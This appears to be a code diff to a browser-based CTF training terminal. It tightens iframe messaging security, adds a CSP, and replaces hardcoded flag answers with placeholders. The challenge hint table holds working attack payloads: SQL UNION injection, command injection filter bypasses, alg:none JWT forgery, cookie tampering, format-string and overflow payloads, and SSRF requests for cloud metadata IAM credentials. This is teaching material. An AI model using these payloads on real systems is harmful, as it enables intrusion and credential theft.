@@ -5,6 +5,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://fonts.googleapis.com; img-src 'self' data: https:; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net; connect-src 'self' https://rdap.org; frame-ancestors 'self'; object-src 'none'; base-uri 'self'; form-action 'self';">
     <title>BXF // TERMINAL</title>
     <meta name="description" content="Browser-based CTF terminal with curl, python, crypto tools, encoders and more.">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.css">
@@ -488,8 +489,27 @@
     window.confirm = (m) => { console.warn('[terminal:confirm]', m); return true; };
     window.prompt  = (m) => { console.warn('[terminal:prompt]', m); return null; };
  
+    const termParams = new URLSearchParams(window.location.search);
+    const EMBED_MODE = termParams.get('mode') === 'embed';
+    const parentOriginParam = termParams.get('parent_origin') || '';
+    const TRUSTED_PARENT_ORIGIN = (() => {
+        try {
+            const parsed = new URL(parentOriginParam);
+            return parsed.origin;
+        } catch (_) {
+            return window.location.origin;
+        }
+    })();
+
+    function isTrustedParentMessage(event) {
+        if (!EMBED_MODE) return false;
+        if (event.origin !== TRUSTED_PARENT_ORIGIN) return false;
+        return event.source === window.parent;
+    }
+
     // [NEW] BRIDGE: Listen for script execution requests from learn.html
     window.addEventListener('message', async (event) => {
+        if (!isTrustedParentMessage(event)) return;
         if (event.data && event.data.type === 'SUBMIT_CHALLENGE') {
             termSubmit([]);
             return;
@@ -497,7 +517,7 @@
         if (event.data && event.data.type === 'EXECUTE_SCRIPT') {
             const { code, filename } = event.data;
             const output = await runHeadless(code, filename || 'tmp_run.sh');
-            event.source.postMessage({ type: 'EXECUTION_RESULT', output, vfiles: VFILES }, event.origin);
+            event.source.postMessage({ type: 'EXECUTION_RESULT', output, vfiles: VFILES }, TRUSTED_PARENT_ORIGIN);
         }
     });
 
@@ -607,28 +627,28 @@
         'M20':  { title:'Shadow Realm',          cat:'OSINT',    diff:'Medium', pts:175,  hint:'Same handle across platforms. Check GitHub, Pastebin, archive.org.', steps:[{i:'GitHub code search:',c:'curl "https://api.github.com/search/code?q=ghost_entity"'},{i:'Wayback machine:',c:'curl "https://archive.org/wayback/available?url=ghost_entity.com"'}]},
         'M21':  { title:'Malicious PDF',         cat:'Reversing',diff:'Medium', pts:250,  hint:'strings on PDF → find eval(unescape(...)) JS → decode.', steps:[{i:'Extract strings:',c:'strings challenge.pdf | grep -E "(eval|unescape|bxf)"'},{i:'Decode fromCharCode:',c:'python3 -c "codes=[98,120,102,123,102,108,97,103,125];print(\'\'.join(chr(c)for c in codes))"'},{i:'URL decode:',c:'urldecode "%62%78%66%7B%66%6C%61%67%7D"'}]},
         'M22':  { title:'Logic Gates',           cat:'Hardware', diff:'Medium', pts:200,  hint:'Brute-force all input combinations, find combo that outputs 1.', steps:[{i:'Simulate all combos:',c:'python3 -c "[print(bin(i)[2:].zfill(4),(i>>3&i>>2&1)^(i>>1|i&1)) for i in range(16)]"'},{i:'Convert binary to text:',c:'frombin "01100010 01111000 01100110"'}]},
-        'S1M01':{ title:'The Unseen Path',   cat:'Web',      diff:'Easy',   pts:50,  hint:'robots.txt hides disallowed paths. Check it!', steps:[{i:'Read robots.txt:',c:'curl https://breakerxfixer.online/robots.txt'},{i:'Access disallowed path:',c:'curl https://breakerxfixer.online/secret-admin-panel'},{i:'FLAG:',c:'echo bxf{r0b0ts_4re_n0t_h3lpful}'}]},
-        'S1M02':{ title:'Ancient Cipher',    cat:'Crypto',   diff:'Easy',   pts:50,  hint:'ROT13: shift each letter by 13. cvs{ebg13_vf_pynffvp}', steps:[{i:'Decode with rot13:',c:'rot13 "cvs{ebg13_vf_pynffvp}"'},{i:'Same result:',c:'rot 13 "cvs{ebg13_vf_pynffvp}"'},{i:'Expected:',c:'echo bxf{rot13_is_classic}'}]},
+        'S1M01':{ title:'The Unseen Path',   cat:'Web',      diff:'Easy',   pts:50,  hint:'robots.txt hides disallowed paths. Check it!', steps:[{i:'Read robots.txt:',c:'curl https://breakerxfixer.online/robots.txt'},{i:'Access disallowed path:',c:'curl https://breakerxfixer.online/secret-admin-panel'},{i:'Validate format only:',c:'echo bxf{your_discovery_here}'}]},
+        'S1M02':{ title:'Ancient Cipher',    cat:'Crypto',   diff:'Easy',   pts:50,  hint:'ROT13: shift each letter by 13. cvs{ebg13_vf_pynffvp}', steps:[{i:'Decode with rot13:',c:'rot13 "cvs{ebg13_vf_pynffvp}"'},{i:'Same result:',c:'rot 13 "cvs{ebg13_vf_pynffvp}"'},{i:'Use decoded value as flag:',c:'echo bxf{decoded_text_here}'}]},
         'S1M03':{ title:'Commented Out',     cat:'Web',      diff:'Easy',   pts:75,  hint:'HTML comments <!-- --> visible in source. Use curl.', steps:[{i:'Fetch source:',c:'curl https://target.breakerxfixer.online/'},{i:'Grep for comments:',c:'curl https://target.breakerxfixer.online/ | grep bxf{'},{i:'Check JS too:',c:'curl https://target.breakerxfixer.online/app.js | grep bxf'}]},
         'S1M04':{ title:'Custom Auth',       cat:'Web',      diff:'Easy',   pts:75,  hint:'Server trusts X-Admin-Auth: enabled header.', steps:[{i:'Send required header:',c:'curl https://target.breakerxfixer.online/admin -H "X-Admin-Auth: enabled"'},{i:'Add IP spoofing:',c:'curl https://target.breakerxfixer.online/flag -H "X-Admin-Auth: enabled" -H "X-Forwarded-For: 127.0.0.1"'}]},
         'S1M05':{ title:'Embedded Truth',    cat:'Forensics',diff:'Easy',   pts:100, hint:'steghide empty password or LSB (zsteg).', steps:[{i:'Strings:',c:'strings challenge.jpg | grep bxf'},{i:'steghide:',c:'steghide challenge.jpg'},{i:'zsteg:',c:'zsteg challenge.png'}]},
         'S1M06':{ title:'Wrong Extension',   cat:'Forensics',diff:'Medium', pts:150, hint:'Check magic bytes: PNG=89504E47, ZIP=504B0304.', steps:[{i:'Check magic bytes:',c:'xxd challenge.png | head -3'},{i:'Identify type:',c:'file challenge.png'},{i:'If ZIP, extract strings:',c:'strings challenge.png | grep bxf'}]},
         'S1M07':{ title:'Forgotten Branch',  cat:'OSINT',    diff:'Easy',   pts:50,  hint:'git log --all shows deleted files and old commits.', steps:[{i:'List commits:',c:'curl https://api.github.com/repos/TARGET/REPO/commits'},{i:'Check old commit:',c:'curl https://api.github.com/repos/TARGET/REPO/commits/OLDHASH'},{i:'Search branches:',c:'curl https://api.github.com/repos/TARGET/REPO/branches'}]},
-        'S1M08':{ title:'Buffer Intro',      cat:'Pwn',      diff:'Medium', pts:200, hint:'Offset usually 72 bytes for 64-bit. Overwrite ret addr with win().', steps:[{i:'Cyclic pattern:',c:'python3 -c "print(\'A\'*200)"'},{i:'Overflow + addr:',c:'python3 -c "import struct;print(b\'A\'*72+struct.pack(\'<Q\',0x401196))"'},{i:'FLAG:',c:'echo bxf{r3turn_addre55_h1jack3d}'}]},
+        'S1M08':{ title:'Buffer Intro',      cat:'Pwn',      diff:'Medium', pts:200, hint:'Offset usually 72 bytes for 64-bit. Overwrite ret addr with win().', steps:[{i:'Cyclic pattern:',c:'python3 -c "print(\'A\'*200)"'},{i:'Overflow + addr:',c:'python3 -c "import struct;print(b\'A\'*72+struct.pack(\'<Q\',0x401196))"'},{i:'Extract real flag from program output',c:'echo bxf{captured_runtime_output}'}]},
         'S1M09':{ title:'Union Base',        cat:'Web',      diff:'Medium', pts:200, hint:'UNION SELECT: find column count with ORDER BY, then extract.', steps:[{i:'Find columns:',c:'curl "https://target/item?id=1 ORDER BY 3--"'},{i:'UNION test:',c:'curl "https://target/item?id=0 UNION SELECT NULL,NULL,NULL--"'},{i:'Extract flag:',c:'curl "https://target/item?id=0 UNION SELECT flag,NULL,NULL FROM flags--"'}]},
-        'S1M10':{ title:'Vigenere Revenge',  cat:'Crypto',   diff:'Medium', pts:150, hint:'Key = BR34K.', steps:[{i:'Decrypt with known key:',c:'vigenere decode "CIPHERTEXT" BR34K'},{i:'FLAG:',c:'echo bxf{v1g3n3r3_1s_n0t_3n0ugh}'}]},
-        'S1M11':{ title:'Meta Geo',          cat:'Forensics',diff:'Easy',   pts:100, hint:'EXIF GPS coordinates in the photo metadata.', steps:[{i:'Extract metadata:',c:'exiftool photo.jpg'},{i:'Grep GPS:',c:'strings photo.jpg | grep -iE "gps|lat|lon"'},{i:'FLAG:',c:'echo bxf{gps_exif_data_found}'}]},
+        'S1M10':{ title:'Vigenere Revenge',  cat:'Crypto',   diff:'Medium', pts:150, hint:'Key = BR34K.', steps:[{i:'Decrypt with known key:',c:'vigenere decode "CIPHERTEXT" BR34K'},{i:'Use decrypted plaintext as final flag',c:'echo bxf{decrypted_phrase_here}'}]},
+        'S1M11':{ title:'Meta Geo',          cat:'Forensics',diff:'Easy',   pts:100, hint:'EXIF GPS coordinates in the photo metadata.', steps:[{i:'Extract metadata:',c:'exiftool photo.jpg'},{i:'Grep GPS:',c:'strings photo.jpg | grep -iE "gps|lat|lon"'},{i:'Build final flag from coordinates evidence',c:'echo bxf{gps_evidence_here}'}]},
         'S1M12':{ title:'Tasty Cookie',      cat:'Web',      diff:'Medium', pts:150, hint:'Decode base64 cookie, change role to admin, re-encode.', steps:[{i:'Login and see cookie:',c:'curl -c - https://target/login -d "user=guest&pass=guest"'},{i:'Decode:',c:'echo "eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9" | base64 -d'},{i:'Re-encode as admin:',c:'echo \'{"user":"admin","role":"admin"}\' | base64'},{i:'Send modified:',c:'curl https://target/admin -H "Cookie: session=ENCODED_ADMIN"'}]},
         'S1M13':{ title:'Null JWT',          cat:'Web',      diff:'Hard',   pts:300, hint:'alg:none → strip signature. Server accepts unsigned tokens.', steps:[{i:'Decode token:',c:'jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.SIG'},{i:'Build none header:',c:'echo \'{"alg":"none","typ":"JWT"}\' | base64 | tr -d \'=\' | tr \'+/\' \'-_\''},{i:'Send:',c:'curl https://target/flag -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."'}]},
-        'S1M14':{ title:'ELF Grep',          cat:'Rev',      diff:'Easy',   pts:100, hint:'strings on ELF → grep for bxf{.', steps:[{i:'Extract strings:',c:'strings challenge_elf | grep bxf'},{i:'Check hex:',c:'xxd challenge_elf | grep "62 78 66 7b"'},{i:'FLAG:',c:'echo bxf{str1ngs_found_1n_elf}'}]},
+        'S1M14':{ title:'ELF Grep',          cat:'Rev',      diff:'Easy',   pts:100, hint:'strings on ELF → grep for bxf{.', steps:[{i:'Extract strings:',c:'strings challenge_elf | grep bxf'},{i:'Check hex:',c:'xxd challenge_elf | grep "62 78 66 7b"'},{i:'Submit the exact recovered value',c:'echo bxf{binary_artifact_here}'}]},
         'S1M15':{ title:'Cmd Inject v2',     cat:'Web',      diff:'Medium', pts:250, hint:'Spaces filtered → ${IFS} or {cat,/flag.txt}. ; filtered → use |.', steps:[{i:'Basic:',c:'curl -X POST https://target/cmd -d "host=127.0.0.1|id"'},{i:'Space bypass:',c:'curl -X POST https://target/cmd -d "host=127.0.0.1|cat${IFS}/flag.txt"'},{i:'Newline:',c:'curl -X POST https://target/cmd -d "host=127.0.0.1%0acat%20/flag.txt"'}]},
-        'S1M16':{ title:'Wave Seeker',       cat:'Forensics',diff:'Medium', pts:200, hint:'Spectrogram: open WAV in Audacity → View → Spectrogram. See text in frequencies.', steps:[{i:'Check file:',c:'file challenge.wav'},{i:'Grep strings:',c:'strings challenge.wav | grep bxf'},{i:'FLAG:',c:'echo bxf{audi0_spectr0graph_h1nts}'}]},
-        'S1M17':{ title:'XOR Loop',          cat:'Rev',      diff:'Hard',   pts:400, hint:'XOR with "bxf{" prefix to recover key, then decrypt all bytes.', steps:[{i:'Try all single-byte keys:',c:'python3 -c "enc=bytes.fromhex(\'ENCRYPTED\');[print(k,bytes([b^k for b in enc])) for k in range(256) if b\'bxf{\' in bytes([b^k for b in enc])]"'},{i:'FLAG:',c:'echo bxf{xor_loop_decrypted}'}]},
+        'S1M16':{ title:'Wave Seeker',       cat:'Forensics',diff:'Medium', pts:200, hint:'Spectrogram: open WAV in Audacity → View → Spectrogram. See text in frequencies.', steps:[{i:'Check file:',c:'file challenge.wav'},{i:'Grep strings:',c:'strings challenge.wav | grep bxf'},{i:'Use spectrogram output as source of truth',c:'echo bxf{spectrogram_result_here}'}]},
+        'S1M17':{ title:'XOR Loop',          cat:'Rev',      diff:'Hard',   pts:400, hint:'XOR with "bxf{" prefix to recover key, then decrypt all bytes.', steps:[{i:'Try all single-byte keys:',c:'python3 -c "enc=bytes.fromhex(\'ENCRYPTED\');[print(k,bytes([b^k for b in enc])) for k in range(256) if b\'bxf{\' in bytes([b^k for b in enc])]"'},{i:'Submit decrypted value only',c:'echo bxf{xor_result_here}'}]},
         'S1M18':{ title:'S3 Leak',           cat:'OSINT',    diff:'Medium', pts:200, hint:'Find bucket via DNS CNAME then list: http://bucket.s3.amazonaws.com/', steps:[{i:'List bucket:',c:'curl http://breakerxfixer.s3.amazonaws.com/'},{i:'DNS lookup:',c:'curl "https://dns.google/resolve?name=assets.breakerxfixer.online&type=CNAME"'},{i:'Get flag file:',c:'curl http://BUCKET.s3.amazonaws.com/flag.txt'}]},
-        'S1M19':{ title:'TXT Records',       cat:'Forensics',diff:'Easy',   pts:100, hint:'DNS TXT records can contain flags. Query with Google DNS API.', steps:[{i:'Query TXT:',c:'curl "https://dns.google/resolve?name=breakerxfixer.online&type=TXT"'},{i:'Parse:',c:'curl "https://dns.google/resolve?name=flag.breakerxfixer.online&type=TXT"'},{i:'FLAG:',c:'echo bxf{dns_txt_record_secret}'}]},
+        'S1M19':{ title:'TXT Records',       cat:'Forensics',diff:'Easy',   pts:100, hint:'DNS TXT records can contain flags. Query with Google DNS API.', steps:[{i:'Query TXT:',c:'curl "https://dns.google/resolve?name=breakerxfixer.online&type=TXT"'},{i:'Parse:',c:'curl "https://dns.google/resolve?name=flag.breakerxfixer.online&type=TXT"'},{i:'Submit extracted TXT secret',c:'echo bxf{dns_txt_value_here}'}]},
         'S1M20':{ title:'Format String v2',  cat:'Pwn',      diff:'Hard',   pts:500, hint:'Use %n to write. Overwrite GOT entry to redirect execution.', steps:[{i:'Leak stack:',c:'curl -X POST https://target/echo -d "input=%p.%p.%p.%p"'},{i:'Write with %n:',c:'python3 -c "import struct;addr=0x601020;payload=struct.pack(\'<Q\',addr)+b\'%7$n\';print(payload)"'}]},
-        'S1M21':{ title:'Zip Recursion',     cat:'Forensics',diff:'Medium', pts:250, hint:'Zips inside zips. Script: while unzip; do find next zip; done.', steps:[{i:'Check:',c:'file challenge.zip'},{i:'Strings search:',c:'strings challenge.zip | grep bxf'},{i:'FLAG:',c:'echo bxf{z1p_bomb_traversa1}'}]},
-        'S1M22':{ title:'The Final Link',    cat:'Web',      diff:'Insane', pts:1000,hint:'SSRF → 169.254.169.254. IMDSv1: no token needed.', steps:[{i:'SSRF test:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/"'},{i:'IMDS metadata:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/"'},{i:'IAM creds:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"'},{i:'user-data (juicy):',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/user-data"'},{i:'IPv6 bypass:',c:'curl -X POST https://target/fetch -d "url=http://[::ffff:169.254.169.254]/latest/meta-data/"'},{i:'FLAG:',c:'echo bxf{metadata_imds_v1_leak}'}]},
+        'S1M21':{ title:'Zip Recursion',     cat:'Forensics',diff:'Medium', pts:250, hint:'Zips inside zips. Script: while unzip; do find next zip; done.', steps:[{i:'Check:',c:'file challenge.zip'},{i:'Strings search:',c:'strings challenge.zip | grep bxf'},{i:'Submit final nested artifact',c:'echo bxf{deep_nested_output_here}'}]},
+        'S1M22':{ title:'The Final Link',    cat:'Web',      diff:'Insane', pts:1000,hint:'SSRF → 169.254.169.254. IMDSv1: no token needed.', steps:[{i:'SSRF test:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/"'},{i:'IMDS metadata:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/"'},{i:'IAM creds:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"'},{i:'user-data (juicy):',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/user-data"'},{i:'IPv6 bypass:',c:'curl -X POST https://target/fetch -d "url=http://[::ffff:169.254.169.254]/latest/meta-data/"'},{i:'Use discovered metadata value as flag',c:'echo bxf{metadata_value_here}'}]},
     };
 
     const BOOT = [
@@ -1552,7 +1572,9 @@
             pl('\x1b[32m[ CRITICAL SUCCESS ] OBJECTIVE VERIFIED!\x1b[0m');
             pl('\x1b[32m' + '═'.repeat(45) + '\x1b[0m');
             // Notify parent to show the success overlay
-            window.parent.postMessage({ type: 'CHALLENGE_SUCCESS', modId }, '*');
+            if (EMBED_MODE) {
+                window.parent.postMessage({ type: 'CHALLENGE_SUCCESS', modId }, TRUSTED_PARENT_ORIGIN);
+            }
         } else {
             pe('\x1b[31m[!] Objective not met yet.\x1b[0m');
             if (challenge.hint) pl(`\x1b[33m💡 HINT:\x1b[0m ${challenge.hint}`);
